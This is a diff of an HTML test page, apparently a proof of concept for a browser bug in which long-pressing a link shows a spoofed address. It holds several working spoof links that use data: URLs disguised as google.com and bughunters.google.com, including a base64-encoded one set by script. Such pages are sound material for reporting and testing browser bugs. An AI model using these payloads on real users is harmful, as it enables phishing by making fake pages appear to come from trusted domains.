@@ -1,8 +1,26 @@
 <!DOCTYPE html>
 <html>
   <body>
-      <h1>
-    <a href="data:                                                                      thisisaveryveryveryveryveryveryveryveryverylongstring.google.com/,trust me">Long press to preview Google</a>
-</h1>
+    <h1>
+      <a
+        href="data:                                                                      thisisaveryveryveryveryveryveryveryveryverylongstring.google.com/,trust me"
+        >Long press to preview Google</a
+      >
+    </h1>
+    <h1>
+      <a href="data:text/html,<h1>spoof</h1>aaaaaaaaaaaaaa@google.com"
+        >Long press#1</a
+      >
+      <br /><br />
+      <a href="data:text/html,@www.google.com<h1>call 911 now">Long press#2</a>
+      <br /><br />
+    </h1>
+    <h1>
+      <a id="test">long press to preview Google</a>
+    </h1>
   </body>
+  <script>
+    document.getElementById("test").href =
+      "data:text/html;base64,PGgxPnNwb29mZWQgYnVnaHVudGVycy5nb29nbGUuY29tLCBkb21haW4gbmVlZCB0byBiZSBkaXNwbGF5ZWQgZnJvbSBsZWZ0IHRvIHJpZ2h0LCBub3QgcmlnaHQgdG8gbGVmdDwvaDE+#  https://bughunters.google.com";
+  </script>
 </html>
